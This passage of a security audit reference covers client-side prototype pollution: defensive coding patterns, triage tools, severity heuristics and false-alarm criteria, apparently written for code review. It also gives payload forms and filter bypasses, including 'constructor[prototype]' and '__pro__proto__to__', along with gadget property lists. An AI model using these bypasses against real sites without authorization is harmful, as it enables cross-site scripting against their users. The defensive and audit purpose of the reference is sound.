CodeQL's `BlacklistEqualityGuard` and `BlacklistInclusionGuard` recognise these patterns as sanitizers.

### SAFE — `Object.freeze(Object.prototype)` (and friends) at startup

```javascript
Object.freeze(Object.prototype);
Object.freeze(Array.prototype);
Object.freeze(Map.prototype);
Object.freeze(Function.prototype);
```

In strict-mode, attempts to write polluted properties throw; in sloppy mode they silently no-op. Be aware some polyfills extend prototypes at load time and break under freeze. Apply as the *first* script the page runs.

### SAFE — `structuredClone()` for deep clones (HackTricks)

```javascript
const clone = structuredClone(userInput);                // does not walk prototype chain
```

Replaces the unsafe `JSON.parse(JSON.stringify(obj))` and ad-hoc deep-merge snippets. Note `structuredClone` does NOT merge — it clones — so this is a "don't-deep-merge-in-the-first-place" defense.

### SAFE — `Map` instead of plain object

```javascript
const cache = new Map();
cache.set(userKey, userValue);                           // Map has no prototype-chain lookups
```

### SAFE — `is-plain-object` / `is-extendable` check before recursing

```javascript
const isPlainObject = require('is-plain-object').default;
function merge(dst, src) {
  for (const k of Object.keys(src)) {
    if (isPlainObject(src[k]) && isPlainObject(dst[k])) merge(dst[k], src[k]);
    else dst[k] = src[k];
  }
}
```

CodeQL recognises this via `IsPlainObjectGuard` — `__proto__` payloads (which are `Object.prototype`) and constructor-chained payloads (which point at `Function.prototype`) both fail the plain-object test.

---

## Tooling for Triage

These are dynamic-testing tools, useful when the user explicitly asks for runtime verification or to find sources/gadgets in a minified bundle. SAST findings should still cite source patterns from above.

- **Burp Suite DOM Invader** (PortSwigger, ships with Burp's built-in browser; v2023.6 added a dedicated *Prototype-pollution* tab). Automatically mutates parameter names (`__proto__`, `constructor.prototype`, dot/bracket variants) on every page navigation, polls `Object.prototype` for reflected pollution, and at sink-time shows the exact dereference site. The fastest way to triage a real target.
- **`ppfuzz` 2.0** (HackTricks, 2025) — supports ES-modules, HTTP/2 and WebSocket endpoints; `-A browser` mode spins up headless Chromium and bruteforces DOM-API gadget classes.
- **`ppmap`** — generates payloads of the form `constructor[prototype][ppmap]=reserved`, used together with the breakpoint-debugger snippet below to find the vulnerable code path in a minified bundle.
- **`proto-find`** — alternative scanner.
- **`PPScan`** (browser extension) — passive scanner that watches navigation and flags successful pollution.
- **`protoStalker`** (Chrome DevTools plug-in, 2024) — visualises prototype chains in real-time, flags writes to `onerror`, `innerHTML`, `srcdoc`, `id`, etc.

### Debug-property snippet (HackTricks)

When tooling confirms pollution but the exact dereference is buried, drop this into the JS console *while paused* on the first script breakpoint:

```javascript
Object.defineProperty(Object.prototype, 'YOUR-PROPERTY', {
  __proto__: null,
  get() {
    console.trace();
    return 'polluted';
  },
});
```

`YOUR-PROPERTY` is a candidate gadget (e.g., `innerHTML`, `src`, `href`, `onerror`, `srcdoc`, `whiteList`, `ALLOWED_ATTR`, `template`, `sourceURL`). Resume execution; every time the property is read by anything in the page, the console gets a stack trace pointing to the vulnerable line — the topmost frame in a *library* file is usually the gadget; the bottommost is usually the source.

---

## Confirming a Finding

1. Identify the pollution source: name the parser/merge call (`location.hash` walked by `jquery-deparam`, `$.extend(true, …)`, `_.merge`, hand-rolled `for…in`, BlackFan-cataloged URL parser, etc.) and show the file + line.
2. Trace user-controlled keys to that sink with no `Object.create(null)` target / `Object.hasOwn` guard / `__proto__`-blocklist between source and sink.
3. Confirm reachability of a gadget *in the same realm*. Strong evidence:
   - The page bundles a known BlackFan-cataloged gadget library, AND
   - The polluted property name matches a documented gadget config key (`innerHTML`, `src`, `srcdoc`, `onerror`, `ALLOWED_ATTR`, `whiteList`, `sourceURL`, `template`, `customScriptSrc`, `assethost`, `dataHost`, `cookieName`, …).
   - Or — since 2023 — the page contains any code that calls `new URL(…)` / `new Notification(…)` / `new Worker(…)` / `new Image()` / `new URLSearchParams(…)` and the polluted property is `href` / `title` / `name` / `src` / `toString`.
4. Construct the canonical payload form: bracket OR dot OR constructor variant. If `__proto__` is filtered, retry with `constructor[prototype]`. If the filter is non-recursive, try the `__pro__proto__to__` double-sanitization bypass.
5. Demonstrate the gadget firing — preferred form: harmless `alert(1)` or `console.log` for proof-of-concept. Avoid network beacons in shared environments.
6. Distinguish severity by gadget reached (table below). DOM XSS → High; sanitizer bypass that lets the attacker re-render arbitrary HTML elsewhere → Critical; cookie injection or open-redirect-only → Medium-High.

---

## False Alarms — Do NOT Report

- The "merge" target is `Object.create(null)` *and* the prototype-less object never feeds back into a real `Object`-prototyped object. CodeQL's `PrototypePollutionUtility.ql` excludes this case.
- The merge is gated by a destination-side `hasOwnProperty` guard (CodeQL `HasOwnPropertyGuard`) on the destination — `__proto__`/`constructor` are *not* own properties of normal destination objects.
- The merge is gated by an explicit `key === '__proto__' || key === 'constructor' || key === 'prototype'` blocklist (`BlacklistEqualityGuard` / `BlacklistInclusionGuard`).
- The merge is preceded by `is-plain-object` / `is-extendable` (`IsPlainObjectGuard`).
- Patched library versions: lodash >= 4.17.21, jQuery >= 3.7.0 (CVE-2023-26136/26140 patched), DOMPurify >= 3.0.9 (CVE-2024-45801 patched), sanitize-html >= 2.8.1.
- A pollution source with no gadget that reaches a security-sensitive sink — i.e., the page never bundles any of the BlackFan gadgets, never calls a known browser-API gadget, and the app code does not interpolate any inherited property into HTML / URL / script / sanitizer config. Cap at INFO/Low (defense-in-depth).
- Hash payloads where the page never calls `location.hash` / `URL` parsers and `JSON.parse` with prototype-walking merge. The `#` is browser-only — without a parser, there is no source.
- `JSON.parse(req.body)` alone — `__proto__` becomes own property of the parsed object; only the *next* `_.merge`/recursive copy escalates it.
- Pages that run `Object.freeze(Object.prototype)` at the very first script — verify the freeze precedes any merge in the load order.

---

## Severity Heuristics

| Gadget reached | Default severity |
|----------------|:----------------:|
| Reflected DOM XSS via `innerHTML` / `srcdoc` / `template` polluted gadget on a page reachable by victim with attacker-supplied URL | **High** |
| Stored CSPP via persisted `localStorage`/`sessionStorage`/cached postMessage payload that fires for every visitor on next load | **Critical** |
| HTML-sanitizer bypass that allows an attacker to deliver XSS payloads in *any* sanitized HTML on the polluted page (forum posts, profile fields, etc.) | **Critical** |
| Browser-API gadget (URL/href, Notification/title, Worker/name, Image/src, URLSearchParams/toString) reachable via any pollution source on the same origin | **High–Critical** |
| Arbitrary script load gadget (`Akamai Boomerang.url`, `@analytics/google-tag-manager.customScriptSrc`, `Pendo.dataHost`, `Closure.CLOSURE_BASE_PATH`, `hCaptcha.assethost`) | **Critical** (full-origin compromise via attacker JS) |
| Cookie-injection-only gadget (`Google Analytics.cookieName`) | **Medium** |
| Open-redirect-only gadget (`URLSearchParams.toString` chained with `location.assign`) | **Medium** |
| Pollution source confirmed but no gadget reachable on the page | **Low / Informational** (defense-in-depth) |

**Downgrade** by one level when: the page runs `Object.freeze(Object.prototype)` early, or the only reachable gadget is in dead code, or exploitation requires the victim to perform a chained action (open URL + click + submit) that materially raises attacker effort.

---

## Business Risk

- **Realm-wide compromise.** A successful pollution affects every plain object in the page's JS realm for the page's lifetime — not just the merge target. A single GET request from a marketing campaign or a poisoned cached payload can subvert authentication forms, profile pages, admin tooling.
- **Stealth and longevity.** Pollution does not throw — undefined-property reads simply return the polluted value. Detection requires explicit instrumentation (DevTools `Object.defineProperty` snippet, `protoStalker`, DOM Invader). Symptom-free until the gadget fires.
- **Same-origin pivot.** CSPP commonly pairs with sanitizer-bypass to make stored XSS payloads exploitable that were previously blocked by the sanitizer — pollution is set on visit-1, sanitizer-bypass payload is rendered on visit-2 (which may target a different user/session within the same origin).
- **Third-party tag amplification.** Many CSPP gadgets ship invisibly via marketing tags (Tealium, Adobe DTM, Boomerang, Demandbase, Pendo, Twitter UWT, GTM). The application owner often does not know they are vulnerable.
- **CSP partially helpful but not sufficient.** Strict `script-src 'self'` blocks `<script>`-injection gadgets but not URL-handler XSS (`javascript:` href / `data:` `dataType=script`), DOM-clobbering, sanitizer bypass, or `Object.prototype.href` browser-API gadgets. CSP is defense-in-depth, not a CSPP fix.

---

## Core Principle

Treat every browser-resident parser of `location.search` / `location.hash` / `JSON.parse(...)` / `postMessage`/WS payload that walks attacker keys as a pollution sink unless it is provably safe via:

1. `Object.create(null)` target object that never re-enters a real `Object`-prototyped object, OR
2. Destination-side `hasOwnProperty` / `Object.hasOwn` guard before recursing, OR
3. Explicit blocklist of `__proto__`, `constructor`, `prototype` (recursive — blocking once is bypassable via `__pro__proto__to__`), OR
4. `Map` / `structuredClone` instead of deep merging plain objects, OR
5. `Object.freeze(Object.prototype)` (plus `Array.prototype`, `Map.prototype`, `Function.prototype`) as the first script of the page.

Then audit the gadget surface — every BlackFan-listed library, every HTML sanitizer, every browser-API constructor (`URL`, `Notification`, `Worker`, `Image`, `URLSearchParams`) — and assume that any read of an undefined property from a config-style object is a gadget. Pair the sink with the gadget to determine real impact; do not report sink-only or gadget-only findings as Critical.

For server-side variants of this same conceptual flow (Node.js `child_process` / `execArgv` / `lodash.template` / `bson` chains), see `references/server_side_prototype_pollution.md`.

---

## Analyst Notes

1. The pollution source decides whether the bug fires at all — check the URL/hash/JSON/postMessage/storage pipeline carefully and remember that **hash payloads bypass every server-side filter and most CDN-level WAFs**.
2. The script gadget decides the impact — check the bundle and every tag manager / analytics / sanitizer it loads against the BlackFan catalog and the browser-API gadget list. If both pollution and any of these load on the same page, severity is at least High.
3. `JSON.parse` of attacker JSON is *not* a pollution sink by itself — escalation requires a downstream `$.extend(true, …)` / `_.merge` / recursive copy that walks the parsed object.
4. The **`constructor[prototype]`** variant is the most common "we filtered `__proto__`" bypass; always test it in addition to the dot-bracket variants.
5. The **double-sanitization** payload (`__pro__proto__to__.gadget=value`) is the most common "we strip `__proto__`" bypass; always test it when a strip is observed.
6. Browser-API gadgets (PortSwigger 2023+) make every page exploitable once any pollution source on the same origin is reached. Recommend `Object.freeze(Object.prototype)` at the top of the load order regardless of the bundle's library mix.
7. For DOM Invader-confirmed CSPP, also re-test in incognito / a fresh profile to rule out a stale extension polluting the prototype chain. Browser extensions can pollute, too.
8. When a finding involves a third-party tag (Tealium, Adobe DTM, Boomerang, etc.), document which tag's gadget is reached — the tag vendor, not the app team, is usually the upstream fix owner.
